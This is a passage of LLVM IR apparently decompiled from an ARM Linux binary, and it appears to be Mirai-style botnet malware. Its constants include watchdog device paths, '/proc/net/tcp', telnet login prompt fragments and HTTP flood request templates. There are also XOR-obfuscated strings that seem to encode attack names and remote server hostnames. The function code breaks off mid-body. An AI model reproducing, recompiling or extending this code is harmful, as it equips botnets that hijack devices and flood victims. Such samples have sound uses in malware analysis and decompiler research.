source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1ea38.5 = global i32 0
@global_var_1ea48.6 = global i32* @global_var_1ea38.5
@global_var_1eba8.12 = global i32 0
@global_var_f460.18 = constant i32 -382906384
@global_var_15f1c.21 = constant [4 x i8] c"GET\00"
@1 = constant i32 47
@global_var_ff00.24 = constant i32 -390234064
@global_var_13654.26 = constant i32 -382910448
@global_var_15f14.28 = constant i32 32
@global_var_15eec.30 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_15f04.32 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_15f10.34 = constant [3 x i8] c"\0D\0A\00"
@global_var_15f24.36 = constant [9 x i8] c"Cookie: \00"
@global_var_15f30.38 = constant [3 x i8] c"; \00"
@global_var_15f34.40 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_15f3c.42 = constant i32 59
@global_var_15f40.44 = constant [5 x i8] c"http\00"
@global_var_15f48.46 = constant [5 x i8] c"url=\00"
@global_var_15f50.48 = constant [5 x i8] c"POST\00"
@global_var_12cbc.49 = constant i32 -439275520
@global_var_15f58.51 = constant i32 39
@global_var_15f5c.53 = constant i32 61
@global_var_1ebc4.57 = global i32 0
@global_var_a0cc.58 = constant i32 -352321546
@global_var_142ac.59 = constant i32 -481296384
@global_var_1ebc8.61 = global i32 0
@global_var_1ebcc.62 = local_unnamed_addr global i32 0
@global_var_d7b0.68 = constant i32 -382906384
@global_var_dc74.70 = constant i32 -382906384
@global_var_ce40.72 = constant i32 -382906384
@global_var_c6fc.74 = constant i32 -382906384
@global_var_bf88.76 = constant i32 -382906384
@global_var_b728.78 = constant i32 -382906384
@global_var_b00c.80 = constant i32 -382906384
@global_var_a890.82 = constant i32 -382906384
@global_var_81cc.84 = constant i32 -382906384
@global_var_1ec7c.86 = global i32 0
@global_var_1ec84.97 = global i32 0
@global_var_15f60.99 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_1ebe8.103 = global i32 0
@global_var_1ec80.105 = global i32 0
@global_var_f3d0.107 = constant i32 -382910352
@global_var_1ea54.109 = global i32 77644
@global_var_1ea4c.111 = global i32 -1
@global_var_1ec8c.117 = local_unnamed_addr global i32 0
@global_var_1ec8b.118 = local_unnamed_addr global i32 0
@global_var_1ec8a.119 = local_unnamed_addr global i32 0
@global_var_f248.121 = constant i32 -442556408
@global_var_15f70.123 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1ec89.128 = local_unnamed_addr global i32 0
@global_var_15fc4.130 = constant [3 x i8] c"/.\00"
@global_var_15fa0.132 = constant i32 62048
@global_var_f260.133 = constant i32 -382909968
@global_var_1236c.135 = constant i32 -509607552
@global_var_12424.138 = constant i32 -382906384
@global_var_122b4.140 = constant i32 -509607552
@global_var_15fc0.145 = constant i32 62024
@global_var_15f94.147 = constant i32 10
@global_var_15f80.149 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_1ea50.151 = global i32 -1
@global_var_12f4c.156 = constant i32 -382910224
@global_var_15f98.158 = constant i32 16777216
@global_var_1ebf0.160 = global i32 0
@global_var_1ebfc.162 = global i32 0
@global_var_1ebf4.164 = global i32 0
@global_var_1ebf8.166 = global i32 0
@global_var_15fd8.172 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_1059c.181 = constant i32 -442695668
@global_var_1eca0.183 = global i32 0
@global_var_1ec34.185 = global i32 0
@global_var_1ec00.187 = global i32 0
@global_var_1ec2c.189 = global i32 0
@global_var_1ec98.197 = global i32 0
@global_var_1ec9c.199 = global i32 0
@global_var_1ec07.202 = local_unnamed_addr global i32 0
@global_var_1ec06.203 = local_unnamed_addr global i32 0
@global_var_1ec18.205 = global i32 0
@global_var_1ec0c.207 = local_unnamed_addr global i32 0
@global_var_1ec09.208 = local_unnamed_addr global i32 0
@global_var_1ec19.209 = local_unnamed_addr global i32 0
@global_var_1ec1b.210 = local_unnamed_addr global i32 0
@global_var_1ec0d.211 = local_unnamed_addr global i32 0
@global_var_1ec08.212 = local_unnamed_addr global i32 0
@global_var_1ec1a.213 = local_unnamed_addr global i32 0
@global_var_1ec27.215 = local_unnamed_addr global i32 0
@global_var_1ec26.216 = local_unnamed_addr global i32 0
@global_var_16164.218 = constant [5 x i8] c"PMMV\00"
@global_var_1616c.220 = constant i32 387006810
@global_var_16174.222 = constant [6 x i8] c"TKXZT\00"
@global_var_1617c.224 = constant [6 x i8] c"CFOKL\00"
@global_var_16184.226 = constant i32 437918234
@global_var_1618c.228 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_16194.230 = constant [8 x i8] c"FGDCWNV\00"
@global_var_1619c.232 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_161a8.234 = constant i32 370216979
@global_var_161b0.236 = constant i32 269555223
@global_var_161b8.238 = constant [8 x i8] c"QWRRMPV\00"
@global_var_15f38.240 = constant i32 0
@global_var_15ffc.242 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_16008.244 = constant i32 370216979
@global_var_16010.246 = constant [5 x i8] c"WQGP\00"
@global_var_16018.248 = constant [5 x i8] c"RCQQ\00"
@global_var_16020.250 = constant i32 1263486531
@global_var_1602c.252 = constant i32 320017171
@global_var_16034.254 = constant [9 x i8] c"QOACFOKL\00"
@global_var_16040.256 = constant i32 336860180
@global_var_16048.258 = constant i32 370216979
@global_var_16050.260 = constant i32 324292169
@global_var_16058.262 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_16068.264 = constant [7 x i8] c"OGKLQO\00"
@global_var_16070.266 = constant [8 x i8] c"QGPTKAG\00"
@global_var_16078.268 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_16084.270 = constant [6 x i8] c"EWGQV\00"
@global_var_1608c.272 = constant i32 1263486531
@global_var_16094.274 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_160a4.276 = constant [5 x i8] c"W@LV\00"
@global_var_160ac.278 = constant i32 324292169
@global_var_160b4.280 = constant i32 390551160
@global_var_160bc.282 = constant i32 387009354
@global_var_160c4.284 = constant [6 x i8] c"HT@XF\00"
@global_var_160cc.286 = constant [5 x i8] c"CLIM\00"
@global_var_160d4.288 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_160dc.290 = constant i32 1867011861
@global_var_160ec.292 = constant i32 1867011861
@global_var_160fc.294 = constant [7 x i8] c"Q[QVGO\00"
@global_var_16104.296 = constant [5 x i8] c"KIU@\00"
@global_var_1610c.298 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_16118.300 = constant [8 x i8] c"PGCNVGI\00"
@global_var_16120.302 = constant i32 303174162
@global_var_1612c.304 = constant i32 320017171
@global_var_16134.306 = constant i32 319820054
@global_var_161a0.308 = constant [5 x i8] c"VGAJ\00"
@global_var_1613c.310 = constant [7 x i8] c"OMVJGP\00"
@global_var_16144.312 = constant [7 x i8] c"DWAIGP\00"
@global_var_1ec10.313 = local_unnamed_addr global i32 0
@global_var_1ec0e.315 = local_unnamed_addr global i32 0
@global_var_1ec0f.316 = local_unnamed_addr global i32 0
@global_var_1ec28.318 = local_unnamed_addr global i32 0
@global_var_1ec29.319 = local_unnamed_addr global i32 0
@global_var_1614c.324 = constant [5 x i8] c"ogin\00"
@global_var_16154.326 = constant [6 x i8] c"enter\00"
@global_var_161c9.330 = constant i32 572521471
@global_var_161c0.332 = constant i32 2095871
@global_var_1615c.334 = constant [8 x i8] c"assword\00"
@global_var_1eca8.336 = global i32 0
@global_var_1ea5c.339 = global i32 -559038737
@global_var_161d8.344 = constant [11 x i8] c"AMMNZP\0CVI\22\00"
@global_var_1ecc0.345 = local_unnamed_addr global i32 0
@global_var_1ecc4.346 = local_unnamed_addr global i32 0
@global_var_1ecc5.347 = local_unnamed_addr global i32 0
@global_var_161cc.349 = constant [3 x i8] c"\225\00"
@global_var_1ecc8.350 = local_unnamed_addr global i32 0
@global_var_1eccc.351 = local_unnamed_addr global i32 0
@global_var_1eccd.352 = local_unnamed_addr global i32 0
@global_var_161d0.354 = constant [19 x i8] c"PGQWNVQ\0CAMMNZP\0CVI\22\00"
@global_var_1ed3c.355 = local_unnamed_addr global i32 0
@global_var_1ed38.356 = local_unnamed_addr global i32 0
@global_var_1ed3d.357 = local_unnamed_addr global i32 0
@global_var_161e4.359 = constant i32 51097
@global_var_1ed40.360 = local_unnamed_addr global i32 0
@global_var_1ed44.361 = local_unnamed_addr global i32 0
@global_var_1ed45.362 = local_unnamed_addr global i32 0
@global_var_161e8.364 = constant i32 1448168270
@global_var_1ecbc.365 = local_unnamed_addr global i32 0
@global_var_1ecb8.366 = local_unnamed_addr global i32 0
@global_var_1ecbd.367 = local_unnamed_addr global i32 0
@global_var_161f8.369 = constant i32 1381389898
@global_var_1ecd4.370 = local_unnamed_addr global i32 0
@global_var_1ecd0.371 = local_unnamed_addr global i32 0
@global_var_1ecd5.372 = local_unnamed_addr global i32 0
@global_var_16218.374 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1ecd8.375 = local_unnamed_addr global i32 0
@global_var_1ecdc.376 = local_unnamed_addr global i32 0
@global_var_1ecdd.377 = local_unnamed_addr global i32 0
@global_var_16220.379 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1ece4.380 = local_unnamed_addr global i32 0
@global_var_1ece0.381 = local_unnamed_addr global i32 0
@global_var_1ece5.382 = local_unnamed_addr global i32 0
@global_var_16228.384 = constant i32 1195772418
@global_var_1ecec.385 = local_unnamed_addr global i32 0
@global_var_1ece8.386 = local_unnamed_addr global i32 0
@global_var_1eced.387 = local_unnamed_addr global i32 0
@global_var_16234.389 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1ecf4.390 = local_unnamed_addr global i32 0
@global_var_1ecf0.391 = local_unnamed_addr global i32 0
@global_var_1ecf5.392 = local_unnamed_addr global i32 0
@global_var_1623c.394 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1ecf8.395 = local_unnamed_addr global i32 0
@global_var_1ecfc.396 = local_unnamed_addr global i32 0
@global_var_1ecfd.397 = local_unnamed_addr global i32 0
@global_var_16244.399 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1ed04.400 = local_unnamed_addr global i32 0
@global_var_1ed00.401 = local_unnamed_addr global i32 0
@global_var_1ed05.402 = local_unnamed_addr global i32 0
@global_var_16250.404 = constant i32 1836214128
@global_var_1ed0c.405 = local_unnamed_addr global i32 0
@global_var_1ed08.406 = local_unnamed_addr global i32 0
@global_var_1ed0d.407 = local_unnamed_addr global i32 0
@global_var_16260.409 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1ed10.410 = local_unnamed_addr global i32 0
@global_var_1ed14.411 = local_unnamed_addr global i32 0
@global_var_1ed15.412 = local_unnamed_addr global i32 0
@global_var_1626c.414 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1ed18.415 = local_unnamed_addr global i32 0
@global_var_1ed1c.416 = local_unnamed_addr global i32 0
@global_var_1ed1d.417 = local_unnamed_addr global i32 0
@global_var_16278.419 = constant i32 437738110
@global_var_1ed24.420 = local_unnamed_addr global i32 0
@global_var_1ed20.421 = local_unnamed_addr global i32 0
@global_var_1ed25.422 = local_unnamed_addr global i32 0
@global_var_1629c.424 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1ed2c.425 = local_unnamed_addr global i32 0
@global_var_1ed28.426 = local_unnamed_addr global i32 0
@global_var_1ed2d.427 = local_unnamed_addr global i32 0
@global_var_162a8.429 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1ed34.430 = local_unnamed_addr global i32 0
@global_var_1ed30.431 = local_unnamed_addr global i32 0
@global_var_1ed35.432 = local_unnamed_addr global i32 0
@global_var_162b4.434 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1ed4c.435 = local_unnamed_addr global i32 0
@global_var_1ed48.436 = local_unnamed_addr global i32 0
@global_var_1ed4d.437 = local_unnamed_addr global i32 0
@global_var_162bc.439 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1ed50.440 = local_unnamed_addr global i32 0
@global_var_1ed54.441 = local_unnamed_addr global i32 0
@global_var_1ed55.442 = local_unnamed_addr global i32 0
@global_var_162c4.444 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1ed58.445 = local_unnamed_addr global i32 0
@global_var_1ed5c.446 = local_unnamed_addr global i32 0
@global_var_1ed5d.447 = local_unnamed_addr global i32 0
@global_var_162cc.449 = constant [4 x i8] c"QJ\22\00"
@global_var_1ed64.450 = local_unnamed_addr global i32 0
@global_var_1ed60.451 = local_unnamed_addr global i32 0
@global_var_1ed65.452 = local_unnamed_addr global i32 0
@global_var_162d0.454 = constant i32 1280000013
@global_var_1ed68.455 = local_unnamed_addr global i32 0
@global_var_1ed6c.456 = local_unnamed_addr global i32 0
@global_var_1ed6d.457 = local_unnamed_addr global i32 0
@global_var_162e4.459 = constant i32 1668311919
@global_var_1ed74.460 = local_unnamed_addr global i32 0
@global_var_1ed70.461 = local_unnamed_addr global i32 0
@global_var_1ed75.462 = local_unnamed_addr global i32 0
@global_var_16300.464 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1ed78.465 = local_unnamed_addr global i32 0
@global_var_1ed7c.466 = local_unnamed_addr global i32 0
@global_var_1ed7d.467 = local_unnamed_addr global i32 0
@global_var_1630c.469 = constant i32 1280000013
@global_var_1ed80.470 = local_unnamed_addr global i32 0
@global_var_1ed84.471 = local_unnamed_addr global i32 0
@global_var_1ed85.472 = local_unnamed_addr global i32 0
@global_var_16320.474 = constant i32 1280000013
@global_var_1ed8c.475 = local_unnamed_addr global i32 0
@global_var_1ed88.476 = local_unnamed_addr global i32 0
@global_var_1ed8d.477 = local_unnamed_addr global i32 0
@global_var_16338.479 = constant i32 1464693110
@global_var_1ed94.480 = local_unnamed_addr global i32 0
@global_var_1ed90.481 = local_unnamed_addr global i32 0
@global_var_1ed95.482 = local_unnamed_addr global i32 0
@global_var_16350.484 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1ed9c.485 = local_unnamed_addr global i32 0
@global_var_1ed98.486 = local_unnamed_addr global i32 0
@global_var_1ed9d.487 = local_unnamed_addr global i32 0
@global_var_16364.489 = constant i32 1196376908
@global_var_1eda0.490 = local_unnamed_addr global i32 0
@global_var_1eda4.491 = local_unnamed_addr global i32 0
@global_var_1eda5.492 = local_unnamed_addr global i32 0
@global_var_16374.494 = constant i32 1280068961
@global_var_1edac.495 = local_unnamed_addr global i32 0
@global_var_1eda8.496 = local_unnamed_addr global i32 0
@global_var_1edad.497 = local_unnamed_addr global i32 0
@global_var_1638c.499 = constant i32 1195458915
@global_var_1edb4.500 = local_unnamed_addr global i32 0
@global_var_1edb0.501 = local_unnamed_addr global i32 0
@global_var_1edb5.502 = local_unnamed_addr global i32 0
@global_var_163e0.504 = constant i32 1195458915
@global_var_1edbc.505 = local_unnamed_addr global i32 0
@global_var_1edb8.506 = local_unnamed_addr global i32 0
@global_var_1edbd.507 = local_unnamed_addr global i32 0
@global_var_16404.509 = constant i32 1447841121
@global_var_1edc4.510 = local_unnamed_addr global i32 0
@global_var_1edc0.511 = local_unnamed_addr global i32 0
@global_var_1edc5.512 = local_unnamed_addr global i32 0
@global_var_16438.514 = constant i32 1633044305
@global_var_1edc8.515 = local_unnamed_addr global i32 0
@global_var_1edcc.516 = local_unnamed_addr global i32 0
@global_var_1edcd.517 = local_unnamed_addr global i32 0
@global_var_16448.519 = constant i32 1346651984
@global_var_1edd0.520 = local_unnamed_addr global i32 0
@global_var_1edd4.521 = local_unnamed_addr global i32 0
@global_var_1edd5.522 = local_unnamed_addr global i32 0
@global_var_16454.524 = constant i32 1128353102
@global_var_1edd8.525 = local_unnamed_addr global i32 0
@global_var_1eddc.526 = local_unnamed_addr global i32 0
@global_var_1eddd.527 = local_unnamed_addr global i32 0
@global_var_16460.529 = constant i32 257312593
@global_var_1ede0.530 = local_unnamed_addr global i32 0
@global_var_1ede4.531 = local_unnamed_addr global i32 0
@global_var_1ede5.532 = local_unnamed_addr global i32 0
@global_var_16470.534 = constant i32 1447841089
@global_var_1ede8.535 = local_unnamed_addr global i32 0
@global_var_1edec.536 = local_unnamed_addr global i32 0
@global_var_1eded.537 = local_unnamed_addr global i32 0
@global_var_16484.539 = constant i32 1279479894
@global_var_1edf0.540 = local_unnamed_addr global i32 0
@global_var_1edf4.541 = local_unnamed_addr global i32 0
@global_var_1edf5.542 = local_unnamed_addr global i32 0
@global_var_16498.544 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1edfc.545 = local_unnamed_addr global i32 0
@global_var_1edf8.546 = local_unnamed_addr global i32 0
@global_var_1edfd.547 = local_unnamed_addr global i32 0
@global_var_16380.549 = constant i32 1380403017
@global_var_1ee04.550 = local_unnamed_addr global i32 0
@global_var_1ee00.551 = local_unnamed_addr global i32 0
@global_var_1ee05.552 = local_unnamed_addr global i32 0
@global_var_164a4.554 = constant i32 1280068929
@global_var_1ee08.555 = local_unnamed_addr global i32 0
@global_var_1ee0c.556 = local_unnamed_addr global i32 0
@global_var_1ee0d.557 = local_unnamed_addr global i32 0
@global_var_164b4.559 = constant i32 1414547281
@global_var_1ee14.560 = local_unnamed_addr global i32 0
@global_var_1ee10.561 = local_unnamed_addr global i32 0
@global_var_1ee15.562 = local_unnamed_addr global i32 0
@global_var_164c8.564 = constant i32 1414547281
@global_var_1ee1c.565 = local_unnamed_addr global i32 0
@global_var_1ee18.566 = local_unnamed_addr global i32 0
@global_var_1ee1d.567 = local_unnamed_addr global i32 0
@global_var_164e4.569 = constant i32 1264078191
@global_var_1ee20.570 = local_unnamed_addr global i32 0
@global_var_1ee24.571 = local_unnamed_addr global i32 0
@global_var_1ee25.572 = local_unnamed_addr global i32 0
@global_var_16554.574 = constant i32 1264078191
@global_var_1ee28.575 = local_unnamed_addr global i32 0
@global_var_1ee2c.576 = local_unnamed_addr global i32 0
@global_var_1ee2d.577 = local_unnamed_addr global i32 0
@global_var_165c4.579 = constant i32 1264078191
@global_var_1ee30.580 = local_unnamed_addr global i32 0
@global_var_1ee34.581 = local_unnamed_addr global i32 0
@global_var_1ee35.582 = local_unnamed_addr global i32 0
@global_var_16634.584 = constant i32 1264078191
@global_var_1ee3c.585 = local_unnamed_addr global i32 0
@global_var_1ee38.586 = local_unnamed_addr global i32 0
@global_var_1ee3d.587 = local_unnamed_addr global i32 0
@global_var_166a4.589 = constant i32 1264078191
@global_var_1ee45.590 = local_unnamed_addr global i32 0
@global_var_1ee40.591 = local_unnamed_addr global i32 0
@global_var_1ee44.592 = local_unnamed_addr global i32 0
@global_var_14c94.595 = constant i32 -476053504
@global_var_13a24.599 = constant i32 -443219956
@global_var_13b90.604 = constant i32 -376111092
@global_var_1ec70.607 = global i32 0
@global_var_13d0c.609 = constant i32 -456978431
@global_var_1ee48.611 = global i32 0
@global_var_1ec38.613 = global i32 0
@global_var_1eb5c.616 = global i32 256
@global_var_1ea60.617 = global i32* @global_var_1eb5c.616
@global_var_1ec60.620 = global i32 0
@global_var_1eec8.622 = global i32 0
@global_var_15448.623 = constant i32 -382910416
@global_var_13c90.624 = constant i32 -509595648
@global_var_1432c.631 = constant i32 -442564520
@global_var_1eb68.637 = global i32 0
@global_var_138d0.639 = constant i32 -481230848
@global_var_1ec50.641 = global i32 0
@global_var_15098.643 = constant i32 -509587456
@global_var_16828.645 = constant i32 33554944
@global_var_1eba0.646 = global i32* @global_var_16828.645
@global_var_1eb80.649 = global i32 0
@global_var_1ec54.653 = local_unnamed_addr global i32 0
@global_var_14a4c.655 = constant i32 -352321419
@global_var_1ea2c.659 = global i32 -1
@global_var_1ec64.662 = global i32 0
@global_var_1ec68.664 = local_unnamed_addr global i32 0
@global_var_14c80.665 = constant i32 -390234096
@global_var_1671c.667 = constant [10 x i8] c"/dev/null\00"
@global_var_1ec6c.669 = global i32 0
@global_var_1ec58.674 = local_unnamed_addr global i32 0
@global_var_1ec5c.676 = global i32 0
@global_var_13c70.678 = constant i32 -369096946
@global_var_1eb98 = external local_unnamed_addr global i32
@global_var_13c28.688 = constant i32 -442564608
@global_var_14f48.690 = constant i32 -335544664
@global_var_15064.693 = constant i32 -275775369
@global_var_157dc.694 = constant i32 -382910352
@global_var_1ec78.696 = global i32 0
@global_var_1eee0.699 = global i32 0
@global_var_1eee4.701 = global i32 0
@global_var_1ea30.704 = global i32 0
@global_var_1eba4.3 = external global i8*
@global_var_1ebc0.55 = external global i8*
@global_var_1ebc1.66 = global i8 0
@2 = internal constant [2 x i8] c"\01\00"
@global_var_1ea58.113 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_1ec88.116 = external global i8*
@global_var_1ebec.154 = external global i8*
@global_var_1ec30.191 = external global i8*
@global_var_1ec31.192 = local_unnamed_addr global i8 0
@global_var_1ec04.201 = external global i8*
@global_var_1ec24.206 = local_unnamed_addr global i8 0
@global_var_1ec25.214 = local_unnamed_addr global i8 0
@global_var_1ec1c.317 = local_unnamed_addr global i8 0
@global_var_1ec14.314 = local_unnamed_addr global i8 0
@global_var_15f20.23 = constant [2 x i8] c"/\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  %v1_80a4 = call i32 @function_15e8c(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1eba4.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1eba4.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1ea48.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1ea48.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1ea48.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1ea48.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1eba4.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1ea48.6, { 1, 0 }
  uselistorder i8** @global_var_1eba4.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 125500 to i32*), align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 125500

bb2:                                              ; preds = %.thread
  ret i32 125500

; uselistorder directives
  uselistorder i32 125500, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_14d34(i32 ptrtoint (i32* @global_var_f460.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 89800, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_146fc()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_81cc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_81cc = load i32, i32* @r4, align 4
  store i32 %v3_81cc, i32* %stack_var_-36, align 4
  %v6_81cc = load i32, i32* @r5, align 4
  %v9_81cc = load i32, i32* @r6, align 4
  %v15_81cc = load i32, i32* @r8, align 4
  %v1_81d8 = urem i32 %arg3, 256
  store i32 %v1_81d8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_81e4 = urem i32 %arg1, 256
  store i32 %v1_81e4, i32* %ip.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_81d8, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8200 = inttoptr i32 %arg4 to i32*
